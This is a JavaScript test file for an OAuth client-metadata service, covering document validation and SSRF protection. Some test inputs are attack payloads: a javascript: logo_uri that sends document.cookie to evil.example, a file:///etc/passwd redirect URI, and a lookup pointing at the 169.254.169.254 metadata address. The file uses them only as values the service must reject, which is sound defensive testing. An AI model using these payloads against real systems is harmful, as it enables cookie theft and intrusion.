// dbConnection.js calls process.exit(1) at require time when these are unset,
// and no .env exists in CI or a fresh worktree. Must run before any require
// below that transitively reaches it.
process.env.SUPABASE_URL = process.env.SUPABASE_URL || 'https://example.supabase.co';
process.env.SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'anon-key';
process.env.SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || 'service-role-key';

const { expect } = require('chai');

const clientMetadataService = require('../services/oauth/clientMetadataService');

/**
 * Ticket 41 — the CIMD boundary and document validation.
 * ⚠️ THE BOUNDARY: only `assistant_public` clients are ever dereferenced.
 * Q16 says the MCP server's client_id is "opaque to this server — stored and
 */

const ASSISTANT_ID = 'https://assistant.example/client';
const MCP_SERVER_ID = 'https://mcp.nutrihelp.test/client';

const clientRow = (overrides = {}) => ({
  client_id: ASSISTANT_ID,
  client_type: 'assistant_public',
  token_endpoint_auth_method: 'none',
  is_active: true,
  ...overrides,
});

/**
 * No defaults at all: every case states the whole document, so the cases that
 * test a field's ABSENCE are actually able to omit it.
 */
const documentFor = (fields) => JSON.stringify(fields);

const VALID_DOCUMENT = {
  client_id: ASSISTANT_ID,
  client_name: 'Test Assistant',
  redirect_uris: ['https://assistant.example/callback'],
};

const makeDb = ({ row = clientRow(), error = null } = {}) => {
  const calls = { lookups: 0, writes: 0 };
  const writeTrap = (name) => () => {
    calls.writes += 1;
    throw new Error(`clientMetadataService must not ${name}`);
  };

  return {
    calls,
    from(table) {
      if (table !== 'oauth_clients') throw new Error(`unexpected table: ${table}`);
      return {
        select: () => ({
          eq: () => ({
            maybeSingle: async () => {
              calls.lookups += 1;
              return { data: error ? null : row, error };
            },
          }),
        }),
        insert: writeTrap('insert'),
        upsert: writeTrap('upsert'),
        update: writeTrap('update'),
        delete: writeTrap('delete'),
      };
    },
  };
};

const makeFetcher = (outcome) => {
  const calls = { urls: [] };
  return {
    calls,
    fetchDocument: async (url) => {
      calls.urls.push(url);
      return typeof outcome === 'function' ? outcome(url) : outcome;
    },
  };
};

const okDocument = (fields = VALID_DOCUMENT) => ({
  ok: true,
  status: 200,
  body: documentFor(fields),
  address: '93.184.216.34',
});

const run = (clientId = ASSISTANT_ID, { db, fetcher, log } = {}) => {
  const resolvedDb = db || makeDb();
  const resolvedFetcher = fetcher || makeFetcher(okDocument());
  const events = [];
  const resolvedLog = log || {
    logOperational: async () => {},
    logGrantRefusal: async (context) => events.push(context),
  };

  return {
    db: resolvedDb,
    fetcher: resolvedFetcher,
    events,
    result: clientMetadataService.fetchAndValidateClientMetadata(clientId, {
      supabase: resolvedDb,
      safeMetadataFetch: resolvedFetcher,
      introspectionLog: resolvedLog,
    }),
  };
};

describe('oauth client metadata service', () => {
  describe('⚠️ the boundary — service_confidential is NEVER dereferenced', () => {
    it('refuses to fetch for a registered service_confidential client', async () => {
      const db = makeDb({
        row: clientRow({ client_id: MCP_SERVER_ID, client_type: 'service_confidential' }),
      });
      const { result } = run(MCP_SERVER_ID, { db });
      const outcome = await result;

      expect(outcome.ok).to.equal(false);
      expect(outcome.reason).to.equal('client_type_not_dereferenceable');
    });

    it('makes NO outbound request at all for a service_confidential client', async () => {
      const db = makeDb({
        row: clientRow({ client_id: MCP_SERVER_ID, client_type: 'service_confidential' }),
      });
      const fetcher = makeFetcher(okDocument());
      const { result } = run(MCP_SERVER_ID, { db, fetcher });

      await result;

      expect(fetcher.calls.urls).to.deep.equal([]);
    });

    it('records the refusal as a security event carrying this ticket’s identity', async () => {
      const db = makeDb({
        row: clientRow({ client_id: MCP_SERVER_ID, client_type: 'service_confidential' }),
      });
      const { result, events } = run(MCP_SERVER_ID, { db });

      await result;

      expect(events).to.have.lengthOf(1);
      // Ticket 43's rule: identity passed as arguments, never inherited.
      expect(events[0].eventType).to.equal('mcp_client_metadata_dereference_refused');
      expect(events[0].eventType).to.not.equal('mcp_introspection_grant_inactive');
    });

    it('dereferences a registered assistant_public client', async () => {
      const fetcher = makeFetcher(okDocument());
      const { result } = run(ASSISTANT_ID, { fetcher });

      expect((await result).ok).to.equal(true);
      expect(fetcher.calls.urls).to.deep.equal([ASSISTANT_ID]);
    });

    it('dereferences an UNREGISTERED client id — first-sight CIMD', async () => {
      // A CIMD client presents a URL before any row exists; that is the flow.
      const db = makeDb({ row: null });
      const fetcher = makeFetcher(okDocument());
      const { result } = run(ASSISTANT_ID, { db, fetcher });

      expect((await result).ok).to.equal(true);
      expect(fetcher.calls.urls).to.have.lengthOf(1);
    });

    it('fails closed and does not fetch when the client lookup errors', async () => {
      const db = makeDb({ error: { message: 'connection reset' } });
      const fetcher = makeFetcher(okDocument());
      const { result } = run(MCP_SERVER_ID, { db, fetcher });
      const outcome = await result;

      expect(outcome.ok).to.equal(false);
      expect(outcome.reason).to.equal('client_lookup_failed');
      expect(fetcher.calls.urls).to.deep.equal([]);
    });

    it('refuses an inactive client without fetching', async () => {
      const db = makeDb({ row: clientRow({ is_active: false }) });
      const fetcher = makeFetcher(okDocument());
      const { result } = run(ASSISTANT_ID, { db, fetcher });

      expect((await result).ok).to.equal(false);
      expect(fetcher.calls.urls).to.deep.equal([]);
    });
  });

  describe('it returns metadata and never writes it (the ticket 36 interface)', () => {
    it('returns the validated document for the caller to persist', async () => {
      const { result } = run();
      const outcome = await result;

      expect(outcome.ok).to.equal(true);
      expect(outcome.metadata.client_id).to.equal(ASSISTANT_ID);
    });

    it('maps client_name to the schema’s display_name', async () => {
      const { result } = run();

      expect((await result).metadata.display_name).to.equal('Test Assistant');
    });

    it('returns redirect_uris as an array of strings for TEXT[]', async () => {
      const { result } = run();
      const { redirect_uris: uris } = (await result).metadata;

      expect(uris).to.be.an('array');
      uris.forEach((uri) => expect(uri).to.be.a('string'));
    });

    it('returns ONLY fields that have a column in migration 002', async () => {
      // An exact key-set pin, deliberately. mig 002's oauth_clients has no
      const { result } = run();

      expect(Object.keys((await result).metadata)).to.have.members([
        'client_id',
        'display_name',
        'redirect_uris',
      ]);
    });

    it('drops a javascript: logo_uri instead of passing it through', async () => {
      // The concrete scenario: a consent screen renders logo_uri as an img src
      const fetcher = makeFetcher(
        okDocument({
          ...VALID_DOCUMENT,
          logo_uri: "javascript:fetch('https://evil.example/?c='+document.cookie)",
          client_uri: 'javascript:alert(1)',
        })
      );
      const outcome = await run(ASSISTANT_ID, { fetcher }).result;

      // Still a valid document — these fields are ignored, not fatal.
      expect(outcome.ok).to.equal(true);
      expect(outcome.metadata.logo_uri).to.equal(undefined);
      expect(outcome.metadata.client_uri).to.equal(undefined);
      expect(JSON.stringify(outcome.metadata)).to.not.contain('javascript:');
    });

    it('does not write to the database', async () => {
      // The db double throws on any write, so a persistence attempt is loud.
      const { result, db } = run();

      await result;

      expect(db.calls.writes).to.equal(0);
    });
  });

  describe('the document has to be a client metadata document', () => {
    const refuses = async (fields) => {
      const fetcher = makeFetcher(okDocument(fields));
      const outcome = await run(ASSISTANT_ID, { fetcher }).result;
      expect(outcome.ok).to.equal(false);
      return outcome;
    };

    it('refuses a document whose client_id is not the URL it came from', async () => {
      // CIMD's central check. Without it any URL can serve a document
      const outcome = await refuses({ ...VALID_DOCUMENT, client_id: 'https://evil.example/c' });

      expect(outcome.reason).to.equal('document_client_id_mismatch');
    });

    it('refuses a document with no client_id', async () => {
      await refuses({ client_name: 'x', redirect_uris: ['https://assistant.example/cb'] });
    });

    it('refuses a document with no client_name', async () => {
      // display_name is NOT NULL in the schema; there is no row to write.
      await refuses({ client_id: ASSISTANT_ID, redirect_uris: ['https://assistant.example/cb'] });
    });

    it('refuses an empty or whitespace client_name', async () => {
      await refuses({ ...VALID_DOCUMENT, client_name: '' });
      await refuses({ ...VALID_DOCUMENT, client_name: '   ' });
    });

    it('refuses an absurdly long client_name', async () => {
      await refuses({ ...VALID_DOCUMENT, client_name: 'x'.repeat(5000) });
    });

    it('refuses a non-string client_name', async () => {
      await refuses({ ...VALID_DOCUMENT, client_name: { evil: true } });
    });

    it('refuses a document with no redirect_uris', async () => {
      await refuses({ client_id: ASSISTANT_ID, client_name: 'x' });
    });

    it('refuses an empty redirect_uris array', async () => {
      await refuses({ ...VALID_DOCUMENT, redirect_uris: [] });
    });

    it('refuses a redirect_uris that is not an array', async () => {
      await refuses({ ...VALID_DOCUMENT, redirect_uris: 'https://assistant.example/cb' });
    });

    it('refuses a plaintext http redirect URI on a PUBLIC host', async () => {
      // An authorization code delivered over cleartext to a public host.
      await refuses({ ...VALID_DOCUMENT, redirect_uris: ['http://assistant.example/cb'] });
    });

    it('allows a plaintext http redirect URI on LOOPBACK', async () => {
      // RFC 8252 §7.3 — a native client's loopback redirect is http, and that is correct rather than a concession.
      const fetcher = makeFetcher(
        okDocument({ ...VALID_DOCUMENT, redirect_uris: ['http://127.0.0.1:1234/cb'] })
      );
      const outcome = await run(ASSISTANT_ID, { fetcher }).result;

      expect(outcome.ok).to.equal(true);
    });

    it('allows localhost and the IPv6 loopback', async () => {
      const fetcher = makeFetcher(
        okDocument({
          ...VALID_DOCUMENT,
          redirect_uris: ['http://localhost:1234/cb', 'http://[::1]:5678/cb'],
        })
      );

      expect((await run(ASSISTANT_ID, { fetcher }).result).ok).to.equal(true);
    });

    it('refuses a non-http scheme in redirect_uris', async () => {
      await refuses({ ...VALID_DOCUMENT, redirect_uris: ['javascript:alert(1)'] });
      await refuses({ ...VALID_DOCUMENT, redirect_uris: ['file:///etc/passwd'] });
    });

    it('refuses a redirect URI carrying a fragment', async () => {
      // RFC 6749 §3.1.2 — a redirect endpoint URI must not include a fragment.
      await refuses({ ...VALID_DOCUMENT, redirect_uris: ['https://assistant.example/cb#x'] });
    });

    it('refuses when ANY redirect URI is bad, not just the first', async () => {
      await refuses({
        ...VALID_DOCUMENT,
        redirect_uris: ['https://assistant.example/cb', 'http://evil.example/cb'],
      });
    });

    it('refuses an absurd number of redirect URIs', async () => {
      const many = Array.from({ length: 200 }, (_, i) => `https://assistant.example/cb${i}`);
      await refuses({ ...VALID_DOCUMENT, redirect_uris: many });
    });

    it('refuses a document claiming a confidential auth method', async () => {
      // An assistant_public client can never verify a private_key_jwt — the schema has no row shape for that pairing.
      await refuses({ ...VALID_DOCUMENT, token_endpoint_auth_method: 'private_key_jwt' });
    });

    it('accepts an explicit token_endpoint_auth_method of none', async () => {
      const fetcher = makeFetcher(
        okDocument({ ...VALID_DOCUMENT, token_endpoint_auth_method: 'none' })
      );

      expect((await run(ASSISTANT_ID, { fetcher }).result).ok).to.equal(true);
    });

    it('ignores unknown fields rather than refusing', async () => {
      const fetcher = makeFetcher(
        okDocument({ ...VALID_DOCUMENT, some_future_field: 'x', logo_uri: 'https://a.example/l' })
      );
      const outcome = await run(ASSISTANT_ID, { fetcher }).result;

      expect(outcome.ok).to.equal(true);
      expect(outcome.metadata.some_future_field).to.equal(undefined);
    });

    it('refuses a body that is not JSON', async () => {
      const fetcher = makeFetcher({ ok: true, status: 200, body: 'not json', address: '1.2.3.4' });

      expect((await run(ASSISTANT_ID, { fetcher }).result).ok).to.equal(false);
    });

    it('refuses JSON that is not an object', async () => {
      for (const body of ['[]', '"a string"', 'null', '42']) {
        const fetcher = makeFetcher({ ok: true, status: 200, body, address: '1.2.3.4' });
        // eslint-disable-next-line no-await-in-loop
        expect((await run(ASSISTANT_ID, { fetcher }).result).ok).to.equal(false);
      }
    });
  });

  describe('⚠️ the whole chain, with nothing faked between service and guard', () => {
    // The seam that decides whether any of the guarding reaches production:
    const realFetch = require('../services/oauth/safeMetadataFetch');

    /**
 * The service forwards an ALLOWLIST to fetchDocument — timeoutMs and
 * maxBytes only — so `lookup` and `transport` no longer reach it
 * ambiently, which is the point of that change. A test that needs them
 */
    const realFetchWithSeams = (seams) => ({
      fetchDocument: (url, forwarded) => realFetch.fetchDocument(url, { ...forwarded, ...seams }),
    });

    it('refuses a client whose metadata URL resolves to the metadata address', async () => {
      const opened = [];
      const outcome = await clientMetadataService.fetchAndValidateClientMetadata(ASSISTANT_ID, {
        supabase: makeDb(),
        safeMetadataFetch: realFetchWithSeams({
          // Resolves SUCCESSFULLY to a blocked address. A hostname that merely
          lookup: async () => [{ address: '169.254.169.254', family: 4 }],
          transport: {
            request: () => {
              opened.push('socket');
              throw new Error('a socket must never be opened for a blocked address');
            },
          },
        }),
        introspectionLog: { logOperational: async () => {}, logGrantRefusal: async () => {} },
      });

      // The reason is produced by the real guard, not assigned by this test.
      expect(outcome.ok).to.equal(false);
      expect(outcome.reason).to.contain('link_local');
      expect(opened).to.deep.equal([]);
    });

    it('refuses a private IPv6 answer through the same chain', async () => {
      const outcome = await clientMetadataService.fetchAndValidateClientMetadata(ASSISTANT_ID, {
        supabase: makeDb(),
        safeMetadataFetch: realFetchWithSeams({
          lookup: async () => [{ address: 'fd00::1', family: 6 }],
          transport: {
            request: () => {
              throw new Error('a socket must never be opened for a blocked address');
            },
          },
        }),
        introspectionLog: { logOperational: async () => {}, logGrantRefusal: async () => {} },
      });

      expect(outcome.ok).to.equal(false);
      expect(outcome.reason).to.contain('unique_local');
    });

    it('⚠️ does NOT let a caller disable the SSRF guard through the public function', async () => {
      const reached = [];
      const outcome = await clientMetadataService.fetchAndValidateClientMetadata(ASSISTANT_ID, {
        supabase: makeDb(),
        safeMetadataFetch: {
          // Records exactly what crossed the boundary.
          fetchDocument: async (url, forwarded) => {
            reached.push(forwarded);
            return { ok: false, reason: 'stopped_for_inspection' };
          },
        },
        introspectionLog: { logOperational: async () => {}, logGrantRefusal: async () => {} },
        // Every seam a caller might hand in, ambiently or otherwise.
        addressGuard: { isBlockedAddress: () => ({ blocked: false, family: 4 }) },
        transport: {
          request: () => {
            throw new Error('must not be reachable');
          },
        },
        lookup: async () => [{ address: '169.254.169.254', family: 4 }],
        ca: 'an-attacker-chosen-trust-store',
        budgetMs: 999999,
      });

      expect(outcome.ok).to.equal(false);
      expect(reached).to.have.lengthOf(1);
      // Absence of the seams, not merely a return value.
      expect(Object.keys(reached[0])).to.have.members(['timeoutMs', 'maxBytes']);
      ['addressGuard', 'transport', 'lookup', 'ca', 'budgetMs'].forEach((seam) => {
        expect(reached[0][seam]).to.equal(undefined);
      });
    });

    it('still forwards the tuning knobs, so they are not lost with the seams', async () => {
      const reached = [];
      await clientMetadataService.fetchAndValidateClientMetadata(ASSISTANT_ID, {
        supabase: makeDb(),
        safeMetadataFetch: {
          fetchDocument: async (url, forwarded) => {
            reached.push(forwarded);
            return { ok: false, reason: 'stopped_for_inspection' };
          },
        },
        introspectionLog: { logOperational: async () => {}, logGrantRefusal: async () => {} },
        timeoutMs: 1234,
        maxBytes: 4321,
      });

      expect(reached[0].timeoutMs).to.equal(1234);
      expect(reached[0].maxBytes).to.equal(4321);
    });
  });

  describe('it passes the fetcher’s refusal through', () => {
    it('reports a refused redirect', async () => {
      const fetcher = makeFetcher({ ok: false, reason: 'redirect_refused:302' });

      expect((await run(ASSISTANT_ID, { fetcher }).result).reason).to.equal('redirect_refused:302');
    });
  });

  describe('the client id itself', () => {
    it('refuses a non-https client id before touching the database', async () => {
      const db = makeDb();
      const outcome = await run('http://assistant.example/client', { db }).result;

      expect(outcome.ok).to.equal(false);
      expect(db.calls.lookups).to.equal(0);
    });

    it('refuses a missing client id', async () => {
      expect((await run('').result).ok).to.equal(false);
      expect((await run(null).result).ok).to.equal(false);
    });

    it('applies the FETCHER’s full shape rules before the database, not a subset', async () => {
      // The pre-check reuses parseClientIdUrl. A local protocol-only check was
      const cases = [
        ['https://user:pass@assistant.example/client', 'userinfo'],
        ['https://assistant.example/client?x=1', 'query'],
        ['https://assistant.example/client#frag', 'fragment'],
      ];

      for (const [clientId, why] of cases) {
        const db = makeDb();
        const fetcher = makeFetcher(okDocument());
        // eslint-disable-next-line no-await-in-loop
        const outcome = await run(clientId, { db, fetcher }).result;

        expect(outcome.ok, why).to.equal(false);
        expect(db.calls.lookups, `${why} must not reach the database`).to.equal(0);
        expect(fetcher.calls.urls, `${why} must not be fetched`).to.deep.equal([]);
      }
    });
  });
});
